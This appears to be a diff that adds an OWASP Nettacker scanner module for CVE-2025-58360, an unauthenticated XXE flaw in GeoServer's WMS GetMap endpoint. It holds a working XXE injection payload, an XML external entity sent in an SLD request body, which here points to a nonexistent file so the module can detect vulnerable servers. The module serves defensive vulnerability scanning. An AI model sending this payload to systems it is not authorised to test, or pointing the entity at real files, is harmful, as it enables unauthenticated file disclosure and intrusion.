@@ -1,0 +1,68 @@
+info:
+  name: geoserver_xxe_cve_2025_58360_vuln
+  author: OWASP Nettacker Team
+  severity: 8.2
+  description: |
+    GeoServer versions 2.26.0 to 2.26.2 and 2.25.6 are vulnerable to an
+    unauthenticated XML External Entity (XXE) injection via the
+    /geoserver/wms GetMap operation, allowing attackers to disclose
+    arbitrary files or cause denial of service.
+  reference:
+    - https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-58360
+  profiles:
+    - vuln
+    - http
+    - high_severity
+    - cve
+    - cve2025
+    - xxe
+    - geoserver
+    - kev
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 5
+        headers:
+          Content-Type: "application/vnd.ogc.sld+xml"
+        data: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE root [
+          <!ENTITY xxe SYSTEM "/this_file_does_not_exist">
+          ]>
+          <StyledLayerDescriptor version="1.0.0">
+            <NamedLayer>
+              <Name>&xxe;</Name>
+            </NamedLayer>
+          </StyledLayerDescriptor>
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - http
+                - https
+              ports:
+                - 80
+                - 443
+                - 8080 
+                - 8443
+              paths:
+                - "/geoserver/wms?service=WMS&request=GetMap"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "(?s)(ServiceExceptionReport).*?(java\\.io\\.FileNotFoundException)"
+              reverse: false
+            
